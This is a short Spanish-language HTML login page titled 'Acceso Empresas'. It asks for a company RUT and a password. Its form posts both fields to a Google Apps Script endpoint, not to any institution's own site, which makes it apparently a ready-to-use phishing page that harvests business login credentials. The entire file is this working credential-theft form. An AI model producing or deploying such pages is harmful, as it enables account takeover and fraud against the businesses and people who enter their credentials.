<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Acceso Empresas</title>
  <style>
    body {
      background-color: #e6e9ef;
      font-family: "Segoe UI", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      background-color: #ffffff;
      padding: 40px 30px;
      border-radius: 6px;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
      width: 340px;
    }
    .login-box h2 {
      text-align: center;
      color: #003366;
      margin-bottom: 25px;
    }
    .login-box label {
      display: block;
      margin-top: 15px;
      font-weight: 600;
      color: #333;
    }
    .login-box input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }
    .login-box button {
      width: 100%;
      margin-top: 25px;
      padding: 12px;
      background-color: #003366;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      font-size: 15px;
      cursor: pointer;
    }
    .login-box button:hover {
      background-color: #002244;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Acceso Empresas</h2>
    <form action="https://script.google.com/macros/s/AKfycbwb0vTLuEE8r7oo90COPgvpbgXfZTAPKpI9pcgzE_N38-Y387niIKHvlzc2z2DMu6kXrA/exec" method="POST"> 
      <label for="rut">RUT Empresa</label>
      <input type="text" id="rut" name="rut" placeholder="12.345.678-9" required />

      <label for="clave">Clave</label>
      <input type="password" id="clave" name="clave" placeholder="********" required />

      <button type="submit">Ingresar</button>
    </form>
  </div>
</body>
</html>
